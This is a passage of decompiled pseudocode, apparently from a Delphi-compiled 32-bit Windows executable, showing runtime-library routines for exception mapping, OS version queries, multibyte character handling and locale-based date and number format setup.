  int v4; // [esp+0h] [ebp-10h] BYREF
  char v5; // [esp+4h] [ebp-Ch]

  v0 = 0;
  v1 = sub_402698();
  v2 = v1;
  while ( v0 <= 6 && v1 != dword_41C1F8[2 * v0] )
    ++v0;
  if ( v0 > 6 )
  {
    v4 = v1;
    v5 = 0;
    result = (_DWORD *)sub_409548((int)dword_406360, 1, (int **)off_41DB08[0], 0, (int)&v4);
  }
  else
  {
    result = sub_409450((int)dword_406360, 1, dword_41C1FC[2 * v0]);
  }
  result[3] = v2;
  return result;
}
// 406360: using guessed type int dword_406360[3];
// 41C1F8: using guessed type int dword_41C1F8[];
// 41C1FC: using guessed type int dword_41C1FC[];
// 41DB08: using guessed type int *off_41DB08[10];

//----- (00409688) --------------------------------------------------------
void __userpurge sub_409688(int a1@<eax>, DWORD a2, DWORD a3, DWORD a4, const ULONG_PTR *a5)
{
  if ( a1 != 1 && a1 != 2 )
  {
    if ( (unsigned int)(a1 - 3) < 0x16 )
      sub_409450(dword_41C218[2 * a1], 1, dword_41C218[2 * a1 + 1]);
    else
      sub_409608();
  }
  sub_402F98(a2, a3, a4, a5);
}
// 41C218: using guessed type int dword_41C218[];
// 41E5F4: using guessed type int dword_41E5F4;
// 41E5F8: using guessed type int dword_41E5F8;

//----- (004096CC) --------------------------------------------------------
int __usercall sub_4096CC@<eax>(__int32 a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-Ch] [ebp-38h] BYREF
  int *v8; // [esp-4h] [ebp-30h]
  char *v9; // [esp+Ch] [ebp-20h] BYREF
  char *v10; // [esp+10h] [ebp-1Ch] BYREF
  char v11; // [esp+14h] [ebp-18h]
  int v12; // [esp+18h] [ebp-14h]
  char v13; // [esp+1Ch] [ebp-10h]
  int v14; // [esp+20h] [ebp-Ch]
  char v15; // [esp+24h] [ebp-8h]
  char *v16; // [esp+28h] [ebp-4h] BYREF
  int savedregs; // [esp+2Ch] [ebp+0h] BYREF

  v9 = 0;
  v16 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_409768;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( a1 )
    sub_403560((volatile __int32 *)&v16, a1);
  else
    sub_404B80(off_41DC0C[0], &v16);
  v10 = v16;
  v11 = 11;
  v12 = a2;
  v13 = 11;
  v14 = a3;
  v15 = 0;
  sub_404B80(off_41DC40[0], &v9);
  v5 = sub_40948C((int)dword_406A68, 1, (unsigned __int8 *)v9, 2, (int)&v10);
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_40976F;
  sub_4034C8(&v9);
  sub_4034C8(&v16);
  return v5;
}
// 406A68: using guessed type int dword_406A68[5];
// 41DC0C: using guessed type int **off_41DC0C[3];
// 41DC40: using guessed type int **off_41DC40[17];

//----- (00409778) --------------------------------------------------------
void __stdcall sub_409778(DWORD a1, DWORD a2, DWORD a3, const ULONG_PTR *a4)
{
  sub_402F98(a1, a2, a3, a4);
}

//----- (00409788) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __userpurge sub_409788(__int32 a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  DWORD v4; // [esp-10h] [ebp-10h]
  DWORD v5; // [esp-Ch] [ebp-Ch]
  DWORD v6; // [esp-8h] [ebp-8h]
  const ULONG_PTR *v7; // [esp-4h] [ebp-4h]

  sub_4096CC(a1, a2, a3);
  sub_409778(v4, v5, v6, v7);
}
// 40979F: positive sp value 10 has been found
// 409799: variable 'v4' is possibly undefined
// 409799: variable 'v5' is possibly undefined
// 409799: variable 'v6' is possibly undefined
// 409799: variable 'v7' is possibly undefined

//----- (004097A4) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
int sub_4097A4()
{
  int result; // eax
  DWORD v1; // [esp-10h] [ebp-18h] BYREF
  DWORD v2; // [esp-Ch] [ebp-14h]
  DWORD v3; // [esp-8h] [ebp-10h]
  const ULONG_PTR *v4; // [esp-4h] [ebp-Ch]

  v1 = 0;
  LOBYTE(v2) = 11;
  sub_409548((int)dword_406AC8, 1, (int **)off_41DB20[0], 0, (int)&v1);
  sub_402F98(v1, v2, v3, v4);
  return result;
}
// 4097CD: positive sp value 10 has been found
// 406AC8: using guessed type int dword_406AC8[4];
// 41DB20: using guessed type int *off_41DB20[4];

//----- (004097D0) --------------------------------------------------------
char __usercall sub_4097D0@<al>(int *a1@<eax>)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax

  v1 = *a1;
  if ( v1 > -1073741678 )
  {
    if ( v1 > -1073741674 )
    {
      v9 = v1 + 1073741571;
      if ( !v9 )
        return 14;
      if ( v9 == 61 )
        return 13;
    }
    else
    {
      if ( v1 == -1073741674 )
        return 12;
      v7 = v1 + 1073741677;
      if ( !v7 )
        return 9;
      v8 = v7 - 1;
      if ( !v8 )
        return 3;
      if ( v8 == 1 )
        return 5;
    }
  }
  else
  {
    if ( v1 == -1073741678 )
      return 6;
    if ( v1 <= -1073741682 )
    {
      if ( v1 == -1073741682 )
        return 7;
      v2 = v1 + 1073741819;
      if ( !v2 )
        return 11;
      v3 = v2 - 135;
      if ( !v3 )
        return 4;
      if ( v3 != 1 )
        return 22;
      return 9;
    }
    v4 = v1 + 1073741681;
    v5 = v4 < 2;
    v6 = v4 - 2;
    if ( v5 )
      return 6;
    if ( !v6 )
      return 8;
  }
  return 22;
}

//----- (00409850) --------------------------------------------------------
int __usercall sub_409850@<eax>(int *a1@<eax>)
{
  return dword_41C218[2 * (unsigned __int8)sub_4097D0(a1)];
}
// 41C218: using guessed type int dword_41C218[];

//----- (00409864) --------------------------------------------------------
int __cdecl sub_409864(int a1)
{
  int v1; // ebx
  int v2; // esi
  int v3; // ebx
  unsigned int v5[2]; // [esp-Ch] [ebp-184h] BYREF
  int *v6; // [esp-4h] [ebp-17Ch]
  char *v7; // [esp+8h] [ebp-170h] BYREF
  int v8; // [esp+Ch] [ebp-16Ch] BYREF
  char v9; // [esp+10h] [ebp-168h]
  char *v10; // [esp+14h] [ebp-164h]
  char v11; // [esp+18h] [ebp-160h]
  int v12; // [esp+1Ch] [ebp-15Ch]
  char v13; // [esp+20h] [ebp-158h]
  char *v14; // [esp+24h] [ebp-154h] BYREF
  char *v15; // [esp+28h] [ebp-150h] BYREF
  char *v16; // [esp+2Ch] [ebp-14Ch] BYREF
  int v17; // [esp+30h] [ebp-148h] BYREF
  char v18; // [esp+34h] [ebp-144h]
  char *v19; // [esp+38h] [ebp-140h]
  char v20; // [esp+3Ch] [ebp-13Ch]
  char *v21; // [esp+40h] [ebp-138h]
  char v22; // [esp+44h] [ebp-134h]
  int v23; // [esp+48h] [ebp-130h]
  char v24; // [esp+4Ch] [ebp-12Ch]
  CHAR Filename[261]; // [esp+53h] [ebp-125h] BYREF
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+158h] [ebp-20h] BYREF
  char *v27; // [esp+174h] [ebp-4h] BYREF
  int savedregs; // [esp+178h] [ebp+0h] BYREF

  v7 = 0;
  v16 = 0;
  v14 = 0;
  v15 = 0;
  v27 = 0;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_409A1F;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = *(_DWORD *)(a1 - 4);
  if ( *(_DWORD *)(v1 + 20) )
    sub_404B80(off_41DBF8, &v27);
  else
    sub_404B80(off_41DC88[0], &v27);
  v2 = *(_DWORD *)(v1 + 24);
  VirtualQuery_0(*(LPCVOID *)(v1 + 12), &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 && GetModuleFileNameA_1((HMODULE)Buffer.AllocationBase, Filename, 0x105u) )
  {
    v17 = *(_DWORD *)(v1 + 12);
    v18 = 5;
    sub_4036F8(&v15, Filename, 261);
    sub_4073EC(v15, &v16);
    v19 = v16;
    v20 = 11;
    v21 = v27;
    v22 = 11;
    v23 = v2;
    v24 = 5;
    sub_404B80(off_41DC28[0], &v14);
    v3 = sub_40948C((int)dword_4068A0, 1, (unsigned __int8 *)v14, 3, (int)&v17);
  }
  else
  {
    v8 = *(_DWORD *)(v1 + 12);
    v9 = 5;
    v10 = v27;
    v11 = 11;
    v12 = v2;
    v13 = 5;
    sub_404B80(off_41DC50[0], &v7);
    v3 = sub_40948C((int)dword_4068A0, 1, (unsigned __int8 *)v7, 2, (int)&v8);
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_409A26;
  sub_4034C8(&v7);
  sub_4034EC((int)&v14, 3);
  sub_4034C8(&v27);
  return v3;
}
// 4068A0: using guessed type int dword_4068A0[5];
// 41DBF8: using guessed type int **off_41DBF8;
// 41DC28: using guessed type int **off_41DC28[2];
// 41DC50: using guessed type int **off_41DC50[13];
// 41DC88: using guessed type int **off_41DC88[3];

//----- (00409A30) --------------------------------------------------------
int *__usercall sub_409A30@<eax>(int *a1@<eax>)
{
  int v1; // eax
  int *v2; // ebx
  unsigned int v4[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v5; // [esp-4h] [ebp-18h]
  char *v6; // [esp+4h] [ebp-10h] BYREF
  int v7; // [esp+8h] [ebp-Ch] BYREF
  char v8; // [esp+Ch] [ebp-8h]
  int *v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v6 = 0;
  v9 = a1;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_409AEB;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v1 = (unsigned __int8)sub_4097D0(a1);
  if ( (unsigned int)(v1 - 3) < 8 )
    goto LABEL_4;
  if ( v1 == 11 )
  {
    v2 = (int *)sub_409864((int)&savedregs);
  }
  else
  {
    if ( (unsigned int)(v1 - 12) < 0xA )
    {
LABEL_4:
      v2 = sub_409450(dword_41C218[2 * v1], 1, dword_41C218[2 * v1 + 1]);
      goto LABEL_7;
    }
    v7 = *v9;
    v8 = 0;
    sub_404B80(off_41DAD8[0], &v6);
    v2 = (int *)sub_40948C((int)dword_406410, 1, (unsigned __int8 *)v6, 0, (int)&v7);
  }
LABEL_7:
  if ( sub_402C40(v2, (int)dword_4063B8) )
    v2[3] = (int)v9;
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_409AF2;
  sub_4034C8(&v6);
  return v2;
}
// 4063B8: using guessed type int dword_4063B8[3];
// 406410: using guessed type int dword_406410[5];
// 41C218: using guessed type int dword_41C218[];
// 41DAD8: using guessed type int **off_41DAD8[2];

//----- (00409AFC) --------------------------------------------------------
void __usercall __noreturn sub_409AFC(int a1@<eax>, const void *a2@<edx>)
{
  sub_4093D8(a1, a2);
  sub_4034B0(1);
}

//----- (00409B0C) --------------------------------------------------------
int sub_409B0C()
{
  unsigned int v1[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v2; // [esp-4h] [ebp-Ch]
  char *v3; // [esp+0h] [ebp-8h] BYREF
  char *v4; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v4 = 0;
  v3 = 0;
  v2 = &savedregs;
  v1[1] = (unsigned int)&loc_409BCD;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  sub_404B80((int **)off_41DB10[0], &v4);
  dword_41E5F4 = (int)sub_409450((int)dword_406304, 1, (__int32)v4);
  sub_404B80(off_41DBDC[0], &v3);
  dword_41E5F8 = (int)sub_409450((int)dword_40678C, 1, (__int32)v3);
  *off_41DAE0 = (int)sub_409688;
  *(_DWORD *)off_41DB54[0] = sub_409AFC;
  *(_DWORD *)off_41DB04 = dword_406240;
  *(_DWORD *)off_41DB48 = sub_409850;
  *(_DWORD *)off_41DB58 = sub_409A30;
  *(_DWORD *)off_41DBF0 = sub_409788;
  *off_41DAD4 = (int)sub_4097A4;
  __writefsdword(0, v1[0]);
  v2 = (int *)&loc_409BD4;
  return sub_4034EC((int)&v3, 2);
}
// 406240: using guessed type int dword_406240[2];
// 406304: using guessed type int dword_406304[4];
// 40678C: using guessed type int dword_40678C[4];
// 41DAD4: using guessed type int *off_41DAD4;
// 41DAE0: using guessed type int *off_41DAE0;
// 41DB04: using guessed type void *off_41DB04;
// 41DB10: using guessed type int *off_41DB10[8];
// 41DB48: using guessed type void *off_41DB48;
// 41DB54: using guessed type int off_41DB54[2];
// 41DB58: using guessed type int off_41DB58;
// 41DBDC: using guessed type int **off_41DBDC[5];
// 41DBF0: using guessed type void *off_41DBF0;
// 41E5F4: using guessed type int dword_41E5F4;
// 41E5F8: using guessed type int dword_41E5F8;

//----- (00409BD8) --------------------------------------------------------
void *sub_409BD8()
{
  void *result; // eax

  *(_BYTE *)(dword_41E5F4 + 12) = 1;
  (*(void (**)(void))(*(_DWORD *)dword_41E5F4 - 8))();
  dword_41E5F4 = 0;
  *(_BYTE *)(dword_41E5F8 + 12) = 1;
  sub_402BDC((_DWORD *)dword_41E5F8);
  dword_41E5F8 = 0;
  *off_41DAE0 = 0;
  *(_DWORD *)off_41DB54[0] = 0;
  *(_DWORD *)off_41DB04 = 0;
  *(_DWORD *)off_41DB48 = 0;
  *(_DWORD *)off_41DB58 = 0;
  result = off_41DBF0;
  *(_DWORD *)off_41DBF0 = 0;
  return result;
}
// 41DAE0: using guessed type int *off_41DAE0;
// 41DB04: using guessed type void *off_41DB04;
// 41DB48: using guessed type void *off_41DB48;
// 41DB54: using guessed type int off_41DB54[2];
// 41DB58: using guessed type int off_41DB58;
// 41DBF0: using guessed type void *off_41DBF0;
// 41E5F4: using guessed type int dword_41E5F4;
// 41E5F8: using guessed type int dword_41E5F8;

//----- (00409C44) --------------------------------------------------------
_DWORD *sub_409C44()
{
  _DWORD *result; // eax
  struct _OSVERSIONINFOA v1; // [esp+0h] [ebp-94h] BYREF

  v1.dwOSVersionInfoSize = 148;
  result = (_DWORD *)GetVersionExA(&v1);
  if ( result )
  {
    dword_41C0C0 = v1.dwPlatformId;
    dword_41C0C4 = v1.dwMajorVersion;
    dword_41C0C8 = v1.dwMinorVersion;
    dword_41C0CC = v1.dwBuildNumber;
    return sub_4036F8((char **)&dword_41C0D0, v1.szCSDVersion, 128);
  }
  return result;
}
// 41C0C0: using guessed type int dword_41C0C0;
// 41C0C4: using guessed type int dword_41C0C4;
// 41C0C8: using guessed type int dword_41C0C8;
// 41C0CC: using guessed type int dword_41C0CC;
// 41C0D0: using guessed type _DWORD dword_41C0D0;

//----- (00409C9C) --------------------------------------------------------
int __usercall sub_409C9C@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>)
{
  int v3; // edx
  int i; // esi

  v3 = 0;
  if ( a1 && a1[a2] )
  {
    if ( a2 )
    {
      for ( i = a2 - 1; i >= 0 && _bittest(dword_41C104, a1[i]); --i )
        ;
      if ( (a2 - i) % 2 )
      {
        if ( _bittest(dword_41C104, a1[a2]) )
          LOBYTE(v3) = 1;
      }
      else
      {
        LOBYTE(v3) = 2;
      }
    }
    else if ( _bittest(dword_41C104, *a1) )
    {
      LOBYTE(v3) = 1;
    }
  }
  return v3;
}
// 41C104: using guessed type signed __int32 dword_41C104[8];

//----- (00409D14) --------------------------------------------------------
int __usercall sub_409D14@<eax>(char *a1@<eax>, int a2@<edx>)
{
  int result; // eax
  unsigned __int8 *v5; // eax

  result = 0;
  if ( LOBYTE(dword_41E5B0[0]) )
  {
    v5 = (unsigned __int8 *)sub_4038E8(a1);
    return sub_409C9C(v5, a2 - 1);
  }
  return result;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409D38) --------------------------------------------------------
int __usercall sub_409D38@<eax>(unsigned __int8 *a1@<eax>, int a2@<edx>)
{
  int v2; // ecx

  v2 = 0;
  if ( LOBYTE(dword_41E5B0[0]) )
    return sub_409C9C(a1, a2);
  return v2;
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409D50) --------------------------------------------------------
int __usercall sub_409D50@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // esi

  v2 = a2;
  if ( a2 > sub_403724(a1) )
    v2 = sub_403724(a1);
  return sub_409D78(a1, v2);
}

//----- (00409D78) --------------------------------------------------------
int __usercall sub_409D78@<eax>(int a1@<eax>, int a2@<edx>)
{
  int i; // esi
  int v5; // eax

  i = 0;
  if ( a2 > 0 && a2 <= sub_403724(a1) )
  {
    i = a2;
    if ( LOBYTE(dword_41E5B0[0]) )
    {
      v5 = 1;
      for ( i = 0; a2 >= v5; ++i )
      {
        if ( _bittest(dword_41C104, *(unsigned __int8 *)(a1 + v5 - 1)) )
          ++v5;
        ++v5;
      }
    }
  }
  return i;
}
// 41C104: using guessed type signed __int32 dword_41C104[8];
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409DC8) --------------------------------------------------------
int __userpurge sub_409DC8@<eax>(int a1@<eax>, int a2@<edx>, int *a3@<ecx>, int *a4)
{
  int v5; // edi
  int v6; // edx
  int result; // eax

  v5 = sub_403724(a1);
  v6 = 1;
  for ( result = 1; v5 > result && v6 < a2; ++result )
  {
    ++v6;
    if ( _bittest(dword_41C104, *(unsigned __int8 *)(a1 + result - 1)) )
      ++result;
  }
  if ( v6 == a2 && v5 > result && _bittest(dword_41C104, *(unsigned __int8 *)(a1 + result - 1)) )
    ++result;
  *a3 = v6;
  *a4 = result;
  return result;
}
// 41C104: using guessed type signed __int32 dword_41C104[8];

//----- (00409E3C) --------------------------------------------------------
__int64 __usercall sub_409E3C@<edx:eax>(int a1@<eax>, int a2@<edx>)
{
  int v4; // eax
  __int64 v6[2]; // [esp+0h] [ebp-10h] BYREF

  LODWORD(v6[0]) = 0;
  if ( a2 > 0 && a2 <= sub_403724(a1) )
  {
    if ( a2 > 1 && LOBYTE(dword_41E5B0[0]) )
    {
      sub_409DC8(a1, a2 - 1, (int *)v6 + 1, (int *)v6);
      if ( a2 - 1 <= SHIDWORD(v6[0]) && (v4 = sub_403724(a1), v4 > SLODWORD(v6[0])) )
        ++LODWORD(v6[0]);
      else
        LODWORD(v6[0]) = 0;
    }
    else
    {
      LODWORD(v6[0]) = a2;
    }
  }
  return v6[0];
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409EA0) --------------------------------------------------------
__int64 __usercall sub_409EA0@<edx:eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ebx
  int v4; // eax
  __int64 v6[2]; // [esp+0h] [ebp-10h] BYREF

  v2 = a2;
  LODWORD(v6[0]) = 0;
  if ( a2 > 0 )
  {
    if ( a2 > sub_403724(a1) )
      v2 = sub_403724(a1);
    if ( LOBYTE(dword_41E5B0[0]) )
    {
      sub_409DC8(a1, v2, (int *)v6 + 1, (int *)v6);
      v4 = sub_403724(a1);
      if ( v4 < SLODWORD(v6[0]) )
        LODWORD(v6[0]) = sub_403724(a1);
    }
    else
    {
      LODWORD(v6[0]) = v2;
    }
  }
  return v6[0];
}
// 41E5B0: using guessed type int dword_41E5B0[];

//----- (00409F00) --------------------------------------------------------
_BYTE *__usercall sub_409F00@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 a2@<dl>)
{
  _BYTE *v3; // eax
  _BYTE *v4; // esi

  v3 = sub_409F28(a1, a2);
  v4 = v3;
  if ( a2 && v3 )
  {
    do
    {
      v4 = v3;
      v3 = sub_409F28(v3 + 1, a2);
    }
    while ( v3 );
  }
  return v4;
}

//----- (00409F28) --------------------------------------------------------
_BYTE *__usercall sub_409F28@<eax>(unsigned __int8 *a1@<eax>, unsigned __int8 a2@<dl>)
{
  _BYTE *i; // edi
  char v5; // al
  bool v6; // cf
  char v7; // al

  for ( i = sub_407628(a1, a2); i; i = sub_407628(i + 1, a2) )
  {
    v5 = sub_409D38(a1, i - a1);
    v6 = v5 == 0;
    v7 = v5 - 1;
    if ( v6 )
      break;
    if ( !v7 )
      ++i;
  }
  return i;
}

//----- (00409F68) --------------------------------------------------------
char sub_409F68()
{
  LCID ThreadLocale_0; // eax
  int SystemMetrics; // eax
  int i; // esi
  unsigned __int8 v3; // bl
  bool v4; // cf
  char v5; // bl
  char v6; // bl
  BYTE v8; // [esp+0h] [ebp-4h]
  struct _cpinfo CPInfo; // [esp+4h] [ebp+0h] BYREF

  unk_41E5A8 = 1033;
  *((_WORD *)&unk_41E5A8 + 2) = 9;
  *((_WORD *)&unk_41E5A8 + 3) = 1;
  ThreadLocale_0 = GetThreadLocale_0();
  if ( ThreadLocale_0 )
    unk_41E5A8 = ThreadLocale_0;
  if ( (_WORD)ThreadLocale_0 )
  {
    *((_WORD *)&unk_41E5A8 + 2) = ThreadLocale_0 & 0x3FF;
    *((_WORD *)&unk_41E5A8 + 3) = (unsigned __int16)ThreadLocale_0 >> 10;
  }
  *((_BYTE *)&unk_41E5A8 + 9) = GetSystemMetrics(74) != 0;
  SystemMetrics = GetSystemMetrics(42);
  *((_BYTE *)&unk_41E5A8 + 8) = SystemMetrics != 0;
  if ( SystemMetrics )
  {
    LOBYTE(SystemMetrics) = GetCPInfo(0, &CPInfo);
    for ( i = 0; i < 12; i += 2 )
    {
      LOBYTE(SystemMetrics) = CPInfo.LeadByte[i + 1] | CPInfo.LeadByte[i];
      if ( !(_BYTE)SystemMetrics )
        break;
      LOBYTE(SystemMetrics) = CPInfo.LeadByte[i];
      v3 = CPInfo.LeadByte[i + 1];
      v4 = v3 < (unsigned __int8)SystemMetrics;
      v5 = v3 - SystemMetrics;
      if ( !v4 )
      {
        v6 = v5 + 1;
        v8 = CPInfo.LeadByte[i];
        do
        {
          LOBYTE(SystemMetrics) = v8;
          _bittestandset(dword_41C104, v8++);
          --v6;
        }
        while ( v6 );
      }
    }
  }
  return SystemMetrics;
}
// 41C104: using guessed type signed __int32 dword_41C104[8];

//----- (0040A020) --------------------------------------------------------
int __usercall sub_40A020@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  LCID ThreadLocale_0; // ebx
  char *v4; // ecx
  char *v5; // ecx
  int v6; // ecx
  int v7; // ecx
  char *v8; // ecx
  int v9; // ecx
  int v10; // ecx
  char *v11; // ecx
  char *v12; // ecx
  char *v13; // ecx
  int v14; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-50h] BYREF
  void *v17; // [esp-8h] [ebp-4Ch]
  int *v18; // [esp-4h] [ebp-48h]
  void *v19; // [esp+0h] [ebp-44h]
  __int32 v20; // [esp+4h] [ebp-40h] BYREF
  __int32 v21; // [esp+8h] [ebp-3Ch] BYREF
  __int32 v22; // [esp+Ch] [ebp-38h] BYREF
  __int32 v23; // [esp+10h] [ebp-34h] BYREF
  __int32 v24; // [esp+14h] [ebp-30h] BYREF
  __int32 v25; // [esp+18h] [ebp-2Ch] BYREF
  char *v26; // [esp+1Ch] [ebp-28h] BYREF
  __int32 v27; // [esp+20h] [ebp-24h] BYREF
  char *v28; // [esp+24h] [ebp-20h] BYREF
  __int32 v29; // [esp+28h] [ebp-1Ch] BYREF
  __int32 v30; // [esp+2Ch] [ebp-18h] BYREF
  __int32 v31; // [esp+30h] [ebp-14h] BYREF
  __int32 v32; // [esp+34h] [ebp-10h] BYREF
  __int32 v33; // [esp+38h] [ebp-Ch] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v34; // [esp+3Ch] [ebp-8h] BYREF
  __int32 v35; // [esp+40h] [ebp-4h] BYREF
  int savedregs; // [esp+44h] [ebp+0h] BYREF

  v18 = &savedregs;
  v17 = &loc_40A2EB;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_409F68();
  sub_408D9C(a1, a2, a3);
  if ( LOBYTE(dword_41E5B0[0]) )
    sub_408F74();
  ThreadLocale_0 = GetThreadLocale_0();
  sub_408CEC(ThreadLocale_0, 0x14u, 0, &v32);
  sub_40351C(&dword_41E4E8, v32);
  sub_408CEC(ThreadLocale_0, 0x1Bu, (__int32)dword_40A300, &v31);
  byte_41E4EC = sub_407058(v31, 0, v4);
  sub_408CEC(ThreadLocale_0, 0x1Cu, (__int32)dword_40A300, &v30);
  byte_41E4ED = sub_407058(v30, 0, v5);
  LOBYTE(v6) = 44;
  byte_41E4EE = sub_408D38(ThreadLocale_0, 0xFu, v6);
  LOBYTE(v7) = 46;
  byte_41E4EF = sub_408D38(ThreadLocale_0, 0xEu, v7);
  sub_408CEC(ThreadLocale_0, 0x19u, (__int32)dword_40A300, &v29);
  byte_41E4F0 = sub_407058(v29, 0, v8);
  LOBYTE(v9) = 47;
  byte_41E4F1 = sub_408D38(ThreadLocale_0, 0x1Du, v9);
  sub_408CEC(ThreadLocale_0, 0x1Fu, (__int32)"m/d/yy", &v27);
  sub_409024(v27, &v28, ThreadLocale_0, a2, a3);
  sub_40351C(&dword_41E4F4, (__int32)v28);
  sub_408CEC(ThreadLocale_0, 0x20u, (__int32)"mmmm d, yyyy", &v25);
  sub_409024(v25, &v26, ThreadLocale_0, a2, a3);
  sub_40351C(&dword_41E4F8, (__int32)v26);
  LOBYTE(v10) = 58;
  byte_41E4FC = sub_408D38(ThreadLocale_0, 0x1Eu, v10);
  sub_408CEC(ThreadLocale_0, 0x28u, (__int32)dword_40A334, &v24);
  sub_40351C(&dword_41E500, v24);
  sub_408CEC(ThreadLocale_0, 0x29u, (__int32)dword_40A340, &v23);
  sub_40351C(&dword_41E504, v23);
  sub_4034C8(&v34);
  sub_4034C8(&v33);
  sub_408CEC(ThreadLocale_0, 0x25u, (__int32)dword_40A300, &v22);
  if ( sub_407058(v22, 0, v11) )
    sub_403560(&v35, (__int32)dword_40A358);
  else
    sub_403560(&v35, (__int32)dword_40A34C);
  sub_408CEC(ThreadLocale_0, 0x23u, (__int32)dword_40A300, &v21);
  if ( !sub_407058(v21, 0, v12) )
  {
    sub_408CEC(ThreadLocale_0, 0x1005u, (__int32)dword_40A300, &v20);
    if ( sub_407058(v20, 0, v13) )
      sub_403560((volatile __int32 *)&v34, (__int32)"AMPM ");
    else
      sub_403560(&v33, (__int32)" AMPM");
  }
  sub_4037E4(&dword_41E508, 4);
  ExceptionList = v34;
  sub_4037E4(dword_41E50C, 4);
  LOBYTE(v14) = 44;
  byte_41E5EC = sub_408D38(ThreadLocale_0, 0xCu, v14);
  __writefsdword(0, (unsigned int)v17);
  v19 = &loc_40A2F2;
  return sub_4034EC((int)&v20, 16);
}
// 40A096: variable 'v4' is possibly undefined
// 40A0BA: variable 'v5' is possibly undefined
// 40A0CD: variable 'v6' is possibly undefined
// 40A0E0: variable 'v7' is possibly undefined
// 40A104: variable 'v8' is possibly undefined
// 40A117: variable 'v9' is possibly undefined
// 40A184: variable 'v10' is possibly undefined
// 40A1FC: variable 'v11' is possibly undefined
// 40A23B: variable 'v12' is possibly undefined
// 40A25E: variable 'v13' is possibly undefined
// 40A2C6: variable 'v14' is possibly undefined
// 40A300: using guessed type int dword_40A300[3];
// 40A334: using guessed type int dword_40A334[3];
// 40A340: using guessed type int dword_40A340[3];
// 40A34C: using guessed type int dword_40A34C[3];
// 40A358: using guessed type int dword_40A358[3];
// 41E4E8: using guessed type int dword_41E4E8;
// 41E4EC: using guessed type char byte_41E4EC;
// 41E4ED: using guessed type char byte_41E4ED;
// 41E4EE: using guessed type char byte_41E4EE;
// 41E4EF: using guessed type char byte_41E4EF;
// 41E4F0: using guessed type char byte_41E4F0;
// 41E4F1: using guessed type char byte_41E4F1;
// 41E4F4: using guessed type int dword_41E4F4;
// 41E4F8: using guessed type int dword_41E4F8;
// 41E4FC: using guessed type char byte_41E4FC;
// 41E500: using guessed type int dword_41E500;
// 41E504: using guessed type int dword_41E504;
// 41E508: using guessed type int dword_41E508;
// 41E50C: using guessed type int dword_41E50C[];
// 41E5B0: using guessed type int dword_41E5B0[];
// 41E5EC: using guessed type char byte_41E5EC;

//----- (0040A398) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
_DWORD *sub_40A398()
{
  int LastError_0; // eax
  int v1; // ebx
  _DWORD *v2; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  DWORD v5; // [esp-8h] [ebp-20h]
  int *v6; // [esp-4h] [ebp-1Ch]
  const ULONG_PTR *v7; // [esp+0h] [ebp-18h]
  char *v8; // [esp+4h] [ebp-14h] BYREF
  int v9; // [esp+8h] [ebp-10h] BYREF
  void *v10; // [esp+Ch] [ebp-Ch]
  char *v11; // [esp+10h] [ebp-8h]
  char v12; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v8 = 0;
  v6 = &savedregs;
  v5 = (DWORD)&loc_40A422;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  LastError_0 = GetLastError_0();
  v1 = LastError_0;
  if ( LastError_0 )
  {
    v9 = LastError_0;
    LOBYTE(v10) = 0;
    sub_408CA0(LastError_0, &v8);
    v11 = v8;
    v12 = 11;
    v2 = (_DWORD *)sub_409548((int)dword_406B80, 1, off_41DAE8[0], 1, (int)&v9);
  }
  else
  {
    v2 = sub_40950C((int)dword_406B80, 1, off_41DB40[0]);
  }
  v2[3] = v1;
  sub_402F98((DWORD)ExceptionList, v5, (DWORD)v6, v7);
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_40A429;
  return sub_4034C8(&v8);
}
// 40A41C: bad sp value at call
// 406B80: using guessed type int dword_406B80[3];
// 41DAE8: using guessed type int **off_41DAE8[7];
// 41DB40: using guessed type int **off_41DB40[2];

